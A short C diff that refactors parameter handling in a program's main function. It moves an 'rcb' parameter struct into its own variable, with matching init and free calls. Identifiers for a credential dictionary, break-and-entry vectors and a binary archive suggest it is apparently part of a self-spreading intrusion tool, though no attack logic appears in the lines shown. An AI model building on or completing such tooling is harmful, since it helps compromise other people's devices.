@@ -175,6 +175,7 @@ int main (const int argc, const char **args) {
 	prne_cred_dict_t dict;
 	prne_bin_archive_t ba;
 	prne_bne_param_t param;
+	prne_rcb_param_t rcb;
 	prne_pack_rc_t prc;
 	mbedtls_entropy_context entropy;
 	mbedtls_ctr_drbg_context ctr_drbg;
@@ -191,6 +192,7 @@ int main (const int argc, const char **args) {
 
 	prne_init_cred_dict(&dict);
 	prne_init_bne_param(&param);
+	prne_init_rcb_param(&rcb);
 	prne_init_bin_archive(&ba);
 
 	mbedtls_x509_crt_init(&htbt_ssl.ca);
@@ -295,13 +297,15 @@ int main (const int argc, const char **args) {
 		goto END;
 	}
 
+	rcb.m_dv = m_dv;
+	rcb.dv_len = dv_len;
+	rcb.ba = &ba;
+
 	param.htbt_ssl_conf = &htbt_ssl.conf;
 	param.cred_dict = &dict;
 	param.vector.arr = ARR_VEC;
 	param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
-	param.rcb.m_dv = m_dv;
-	param.rcb.dv_len = dv_len;
-	param.rcb.ba = &ba;
+	param.rcb = &rcb;
 	param.cb.exec_name = cb_exec_name;
 
 	for (size_t i = 0; i < cnt; i += 1) {
@@ -381,6 +385,7 @@ END: // CATCH
 	mbedtls_ssl_config_free(&htbt_ssl.conf);
 	prne_free_cred_dict(&dict);
 	prne_free_bne_param(&param);
+	prne_free_rcb_param(&rcb);
 	prne_free_bin_archive(&ba);
 	prne_close(fd);
 	prne_free(arr);
